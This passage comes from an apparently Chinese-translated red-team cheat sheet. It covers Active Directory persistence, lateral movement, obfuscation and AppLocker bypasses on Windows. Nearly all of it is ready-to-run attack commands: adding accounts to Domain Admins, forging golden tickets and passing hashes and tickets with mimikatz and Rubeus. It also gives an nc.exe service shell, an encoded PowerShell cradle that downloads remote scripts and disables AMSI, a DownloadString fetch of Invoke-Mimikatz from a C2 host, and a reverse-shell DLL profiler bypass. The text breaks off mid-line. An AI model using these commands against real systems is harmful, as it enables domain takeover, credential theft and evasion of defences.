class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; m0chan /add /domain</span><br><span class="line">net localgroup &quot;Administrators&quot; /add</span><br><span class="line">net user m0chan /domain /comment:&quot;Your Blueteam Fucking Sucks&quot;</span><br></pre></td></tr></table></figure><h4 id="6-10-Kerberos的持久性"><a href="#6-10-Kerberos的持久性" class="headerlink" title="6.10 Kerberos的持久性"></a>6.10 Kerberos的持久性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. </span><br><span class="line"></span><br><span class="line">They can be injected into session with mimikatz or Rebeus. </span><br><span class="line"></span><br><span class="line">But let&apos;s say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi </span><br><span class="line"></span><br><span class="line">SID is the domain SID</span><br><span class="line"></span><br><span class="line">Inject Ticket</span><br><span class="line"></span><br><span class="line">kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">Can also inject kirbi with Rebeus</span><br></pre></td></tr></table></figure><h1 id="0x07-横向运动"><a href="#0x07-横向运动" class="headerlink" title="0x07 横向运动"></a>0x07 横向运动</h1><h2 id="7-1-Plink"><a href="#7-1-Plink" class="headerlink" title="7.1 Plink"></a>7.1 Plink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br><span class="line"></span><br><span class="line">#Windows 1803 Built in SSH Client (By Default)</span><br><span class="line"></span><br><span class="line">ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS</span><br></pre></td></tr></table></figure><h2 id="7-2-Powershell端口转发"><a href="#7-2-Powershell端口转发" class="headerlink" title="7.2 Powershell端口转发"></a>7.2 Powershell端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip</span><br><span class="line"></span><br><span class="line">Permanent ^^</span><br><span class="line"></span><br><span class="line">Requires iphlpsvc service to be enabled</span><br><span class="line"></span><br><span class="line">fromport: the port number to listen on, e.g. 80</span><br><span class="line">fromip: the ip address to listen on, e.g. 192.168.1.1</span><br><span class="line">toport: the port number to forward to</span><br><span class="line">toip: the ip address to forward to</span><br></pre></td></tr></table></figure><h2 id="7-3-Invoke-SocksProxy"><a href="#7-3-Invoke-SocksProxy" class="headerlink" title="7.3 Invoke-SocksProxy"></a>7.3 Invoke-SocksProxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/p3nt4/Invoke-SocksProxy/</span><br><span class="line"></span><br><span class="line">Local Socks4 Proxy on 1080</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-SocksProxy -bindPort 1080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reverse Socks Proxy on Remote Machine Port 1080</span><br><span class="line"></span><br><span class="line"># On the remote host: </span><br><span class="line"># Generate a private key and self signed cert</span><br><span class="line">openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem</span><br><span class="line"></span><br><span class="line"># Get the certificate fingerprint to verify it:</span><br><span class="line">openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d &quot;=&quot; -f 2 | tr -d &quot;:&quot;</span><br><span class="line"></span><br><span class="line"># Start the handler</span><br><span class="line">python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key</span><br><span class="line"></span><br><span class="line"># On the local host:</span><br><span class="line">Import-Module .\Invoke-SocksProxy.psm1</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 </span><br><span class="line"></span><br><span class="line"># Go through the system proxy:</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy</span><br><span class="line"></span><br><span class="line"># Validate certificate</span><br><span class="line">Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy -certFingerprint &apos;93061FDB30D69A435ACF96430744C5CC5473D44E&apos;</span><br></pre></td></tr></table></figure><h2 id="7-4-Socat-for-Windows"><a href="#7-4-Socat-for-Windows" class="headerlink" title="7.4 Socat for Windows"></a>7.4 Socat for Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/StudioEtrange/socat-windows</span><br><span class="line"></span><br><span class="line">Generate SSL Cert for Encryption</span><br><span class="line">openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key</span><br><span class="line"></span><br><span class="line">Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -</span><br><span class="line">Client : socat - OPENSSL:localhost:443</span><br><span class="line"></span><br><span class="line">#Port Forward</span><br><span class="line"></span><br><span class="line">socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443</span><br><span class="line"></span><br><span class="line">All SSL Connections will be redirected to 202.54.1.5:443</span><br><span class="line"></span><br><span class="line">#Non SSL Port Forward</span><br><span class="line">socat TCP-LISTEN:80,fork TCP:202.54.1.5:80</span><br></pre></td></tr></table></figure><h2 id="7-5-SharpExec"><a href="#7-5-SharpExec" class="headerlink" title="7.5 SharpExec"></a>7.5 SharpExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/anthemtotheego/SharpExec</span><br><span class="line"></span><br><span class="line">C# Implementation of Conventional Lateral Movement Techniques, such as </span><br><span class="line"></span><br><span class="line">-WMIExec - Semi-Interactive shell that runs as the user. Best described as a less mature version of Impacket&apos;s wmiexec.py tool.</span><br><span class="line"></span><br><span class="line">-SMBExec - Semi-Interactive shell that runs as NT Authority\System. Best described as a less mature version of Impacket&apos;s smbexec.py tool.</span><br><span class="line"></span><br><span class="line">-PSExec (like functionality) - Gives the operator the ability to execute remote commands as NT Authority\System or upload a file and execute it with or without arguments as NT Authority\System.</span><br><span class="line"></span><br><span class="line">-WMI - Gives the operator the ability to execute remote commands as the user or upload a file and execute it with or without arguments as the user.</span><br></pre></td></tr></table></figure><h2 id="7-6-安全套接字漏斗"><a href="#7-6-安全套接字漏斗" class="headerlink" title="7.6 安全套接字漏斗"></a>7.6 安全套接字漏斗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf</span><br><span class="line">#git clone https://github.com/securesocketfunneling/ssf.git</span><br><span class="line"></span><br><span class="line">Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself.</span><br></pre></td></tr></table></figure><h2 id="7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><a href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）" class="headerlink" title="7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）"></a>7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html</span><br></pre></td></tr></table></figure><h2 id="7-8-CrackMapExec"><a href="#7-8-CrackMapExec" class="headerlink" title="7.8 CrackMapExec"></a>7.8 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/</span><br></pre></td></tr></table></figure><h2 id="7-9-WMIC-Spawn-Process"><a href="#7-9-WMIC-Spawn-Process" class="headerlink" title="7.9 WMIC Spawn Process"></a>7.9 WMIC Spawn Process</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create &quot;powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA==&quot;</span><br></pre></td></tr></table></figure><h2 id="7-10-WinRS"><a href="#7-10-WinRS" class="headerlink" title="7.10 WinRS"></a>7.10 WinRS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs</span><br><span class="line"></span><br><span class="line">winrs [/&lt;parameter&gt;[:&lt;value&gt;]] &lt;command&gt;  </span><br><span class="line"></span><br><span class="line">winrs /r:https://contoso.com command</span><br><span class="line"></span><br><span class="line">winrs /r:http://[1080:0:0:0:8:800:200C:417A]:80 command  </span><br><span class="line"></span><br><span class="line">winrs /r:myserver /ad /u:administrator /p:$%fgh7 dir \\anotherserver\share</span><br></pre></td></tr></table></figure><h2 id="7-11-Invoke-WMIExec-ps1"><a href="#7-11-Invoke-WMIExec-ps1" class="headerlink" title="7.11 Invoke-WMIExec.ps1"></a>7.11 Invoke-WMIExec.ps1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net user user pass /add /domain&quot;</span><br><span class="line"></span><br><span class="line">PS C:\users\user\Downloads&gt; Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d</span><br><span class="line">7b832fa -Command &quot;net group &quot;&quot;Domain Admins&quot;&quot; m0chan /add /domain&quot;</span><br></pre></td></tr></table></figure><h2 id="7-12-Powershell调用命令（需要端口5985）"><a href="#7-12-Powershell调用命令（需要端口5985）" class="headerlink" title="7.12 Powershell调用命令（需要端口5985）"></a>7.12 Powershell调用命令（需要端口5985）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;pass&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;m0chan\user&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure><h2 id="7-13-PSExec"><a href="#7-13-PSExec" class="headerlink" title="7.13 PSExec"></a>7.13 PSExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\dc01.m0chanAD.local cmd.exe</span><br></pre></td></tr></table></figure><h2 id="7-14-Powershell-Remoting"><a href="#7-14-Powershell-Remoting" class="headerlink" title="7.14 Powershell Remoting"></a>7.14 Powershell Remoting</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$secpasswd = ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&apos;WS02\USER&apos;, $secpasswd)</span><br><span class="line"></span><br><span class="line">$Session = New-PSSession -ComputerName FileServer -Credential $cred</span><br><span class="line">Enter-PSSession $Session</span><br></pre></td></tr></table></figure><h2 id="7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><a href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）" class="headerlink" title="7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）"></a>7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.15 [password] /u:DOMAIN\m0chan</span><br><span class="line"></span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k COMMAND&quot;</span><br><span class="line">sc \\192.168.0.15 create &lt;service_name&gt; binpath= &quot;cmd.exe /k &lt;c:\tools\nc.exe -L -p &lt;port&gt; -e cmd.exe&gt;&quot;</span><br><span class="line">sc \\192.168.0.15 start &lt;service_name&gt;</span><br></pre></td></tr></table></figure><h2 id="7-16-Pass-The-Hash"><a href="#7-16-Pass-The-Hash" class="headerlink" title="7.16 Pass-The-Hash"></a>7.16 Pass-The-Hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;ip&gt; -u &lt;user&gt; -H &quot;&lt;lm&gt;&quot; -x &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec &lt;user&gt;@&lt;ip&gt; -hashes &lt;lm:nt&gt;</span><br><span class="line"></span><br><span class="line">pth-winexe -U &lt;user&gt;%&lt;ntlm&gt; //&lt;ip&gt; &quot;&lt;msfvenom psh-cmd&gt;&quot;</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes :&lt;hash&gt; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;ntlm&gt; /v:&lt;ip&gt;:3389 /dynamic-resolution</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</span><br></pre></td></tr></table></figure><h2 id="7-17-Pass-The-Ticket"><a href="#7-17-Pass-The-Ticket" class="headerlink" title="7.17 Pass-The-Ticket"></a>7.17 Pass-The-Ticket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line"></span><br><span class="line">Rebeus monitor /interval:30 </span><br><span class="line"></span><br><span class="line">Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets</span><br><span class="line"></span><br><span class="line">Reubus will now give you a Kerberos ticket in base64 which you can pass with</span><br><span class="line"></span><br><span class="line">Rubeus.exe ptt /ticket:[base64blobhere]</span><br><span class="line"></span><br><span class="line">We can now request TGS service tickets to access network resources as this user</span><br></pre></td></tr></table></figure><h1 id="0x08-混淆-规避技术"><a href="#0x08-混淆-规避技术" class="headerlink" title="0x08 混淆/规避技术"></a>0x08 混淆/规避技术</h1><h2 id="8-1-调用混淆"><a href="#8-1-调用混淆" class="headerlink" title="8.1 调用混淆"></a>8.1 调用混淆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line"></span><br><span class="line">Can obfusacte Scripts &amp; Commands </span><br><span class="line"></span><br><span class="line">Obfusacte script from remote url </span><br><span class="line"></span><br><span class="line">SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1</span><br><span class="line"></span><br><span class="line">Can also set Sscript block base64 PS</span><br><span class="line"></span><br><span class="line">SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==</span><br></pre></td></tr></table></figure><h2 id="8-2-调用-CradleCraft"><a href="#8-2-调用-CradleCraft" class="headerlink" title="8.2 调用-CradleCraft"></a>8.2 调用-CradleCraft</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter</span><br><span class="line"></span><br><span class="line">Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e</span><br><span class="line"></span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://c2server.com/Invoke-Mimikatz.ps1&apos;)</span><br></pre></td></tr></table></figure><h2 id="8-3-调用DOSfuscation"><a href="#8-3-调用DOSfuscation" class="headerlink" title="8.3 调用DOSfuscation"></a>8.3 调用DOSfuscation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-DOSfuscation</span><br></pre></td></tr></table></figure><h2 id="8-4-Unicorn"><a href="#8-4-Unicorn" class="headerlink" title="8.4 Unicorn"></a>8.4 Unicorn</h2><blockquote><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicorn.py Nishang.ps1</span><br></pre></td></tr></table></figure><h1 id="0x09-AppLocker-约束模式绕过"><a href="#0x09-AppLocker-约束模式绕过" class="headerlink" title="0x09 AppLocker /约束模式绕过"></a>0x09 AppLocker /约束模式绕过</h1><h2 id="9-1-验证您是否处于受限模式"><a href="#9-1-验证您是否处于受限模式" class="headerlink" title="9.1 验证您是否处于受限模式"></a>9.1 验证您是否处于受限模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure><h2 id="9-2-Powershell非常少旁路"><a href="#9-2-Powershell非常少旁路" class="headerlink" title="9.2 Powershell非常少旁路"></a>9.2 Powershell非常少旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/decoder-it/powershellveryless.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll </span><br><span class="line">/out:C:\Users\m0chan\Scripts\powershellveryless.exe </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Execute -&gt; powershellveryless.exe script.ps1</span><br><span class="line"></span><br><span class="line">script.ps1 = Script of your Choice</span><br></pre></td></tr></table></figure><h2 id="9-3-世界可写文件夹（在Windows-10-1803上为默认）"><a href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）" class="headerlink" title="9.3 世界可写文件夹（在Windows 10 1803上为默认）"></a>9.3 世界可写文件夹（在Windows 10 1803上为默认）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</span><br><span class="line"></span><br><span class="line">C:\Windows\Tasks </span><br><span class="line">C:\Windows\Temp </span><br><span class="line">C:\windows\tracing</span><br><span class="line">C:\Windows\Registration\CRMLog</span><br><span class="line">C:\Windows\System32\FxsTmp</span><br><span class="line">C:\Windows\System32\com\dmp</span><br><span class="line">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\Windows\System32\spool\PRINTERS</span><br><span class="line">C:\Windows\System32\spool\SERVERS</span><br><span class="line">C:\Windows\System32\spool\drivers\color</span><br><span class="line">C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\FxsTmp</span><br><span class="line">C:\Windows\SysWOW64\com\dmp</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter</span><br><span class="line">C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System</span><br></pre></td></tr></table></figure><h2 id="9-4-降级攻击"><a href="#9-4-降级攻击" class="headerlink" title="9.4 降级攻击"></a>9.4 降级攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Downgrading to PS Version 2 circumvates Constrained Mode</span><br><span class="line"></span><br><span class="line">powershell.exe -version 2</span><br><span class="line"></span><br><span class="line">Verifiy versions with $PSVersionTable</span><br><span class="line">Get-Host</span><br></pre></td></tr></table></figure><h2 id="9-5-AppLocker-COR配置文件绕过"><a href="#9-5-AppLocker-COR配置文件绕过" class="headerlink" title="9.5 AppLocker COR配置文件绕过"></a>9.5 AppLocker COR配置文件绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set COR_ENABLE_PROFILING=1</span><br><span class="line">COR_PROFILER=&#123;cf0d821e-299b-5307-a3d8-b283c03916db&#125;</span><br><span class="line">set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll</span><br><span class="line">tzsync</span><br><span class="line">powershell</span><br><span class="line"></span><br><span class="line">Where .DLL is your payload i/e reverse shell, beacon etc.</span><br></pre></td></tr></table></figure><h2 id="9-6-MSBuild-Powershell-CMD旁路"><a href="#9-6-MSBuild-Powershell-CMD旁路" class="headerlink" title="9.6 MSBuild Powershell / CMD旁路"></a>9.6 MSBuild Powershell / CMD旁路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You can use this if cmd is not disabled but powershell is</span><br><span class="line"></span><br><span class="line">https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj</span><br><span class="line"></span><br><span class="line">Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c</span><br><span class="line"></span><br><span class="line">MSBuild PSAttack :D :D</span><br></pre></td></tr></table></figure><h2 id="9-7-PSAttack"><a href="#9-7-PSAttack" class="headerlink" title="9.7 PSAttack"></a>9.7 PSAttack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/jaredhaight/PSAttack</span><br><span class="line"></span><br><span class="line">Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.</span><br><span class="line"></span><br><span class="line">Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)</span><br></pre></td></tr></table></figure><h2 id="9-8-NoPowerShell"><a href="#9-8-NoPowerShell" class="headerlink" title="9.8 NoPowerShell"></a>9.8 NoPowerShell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/bitsadmin/nopowershell</span><br><span class="line"></span><br><span class="line">Primiarily to be used with Cobalt &amp; Execute Assembly but can also be reflectively loaded from any other C2 infra.</span><br></pre></td></tr></table></figure><h2 id="9-9-runDLL32绕过"><a href="#9-9-runDLL32绕过" class="headerlink" title="9.9 runDLL32绕过"></a>9.9 runDLL32绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#Reference: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</span><br><span class="line"></span><br><span class="line">rundll32.exe is a .exe found on all Windows based systems located at C:\Windows\system32\rundll32.exe</span><br><span class="line"></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL 